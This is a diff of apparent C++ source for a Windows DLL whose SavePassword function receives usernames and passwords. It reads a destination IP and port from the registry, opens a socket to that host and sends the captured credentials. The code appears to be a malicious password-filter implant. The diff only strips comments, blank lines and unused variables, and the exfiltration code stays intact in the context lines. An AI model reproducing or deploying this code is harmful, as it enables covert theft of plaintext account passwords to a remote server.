@@ -1,4 +1,3 @@
-// dllmain.cpp : Defines the entry point for the DLL application.
 #include "pch.h"
 #include "stdafx.h"
 #include <WinSock2.h>
@@ -16,7 +15,6 @@ DWORD getPtReg()
 	DWORD Type;
 	DWORD Datasize = 255;
 	DWORD port;
-
 
 	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
 		rKey,
@@ -79,15 +77,11 @@ char * getIPReg()
 					ipa[indCtr] = Data[i];
 					indCtr++;
 				}
-
 			}
-			//printf("%s", ipa);
 			RegCloseKey(hKey);
 			return ipa;
 		}
-
 	}
-
 	RegCloseKey(hKey);
 	return ipa;
 }
@@ -95,12 +89,6 @@ char * getIPReg()
 
 int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 {
-	HKEY hKey;
-	char Data[255];
-	DWORD Datasize = sizeof(Data);
-	DWORD Type;
-	char* ipa;
-
 	char* ip = getIPReg();
 	DWORD port = getPtReg();
 	printf("%s:%d", ip, port);
@@ -138,7 +126,6 @@ int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 
 	printf("Socket created.\n");
 
-
 	server.sin_addr.s_addr = inet_addr(ip);
 	server.sin_family = AF_INET;
 	server.sin_port = htons(port);
@@ -153,7 +140,6 @@ int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 	puts("Connected");
 
 	//Send some data
-	//message = "GET / HTTP/1.1\r\n\r\n";
 	if (send(s, creds, strlen(creds), 0) < 0)
 	{
 		puts("Send failed");
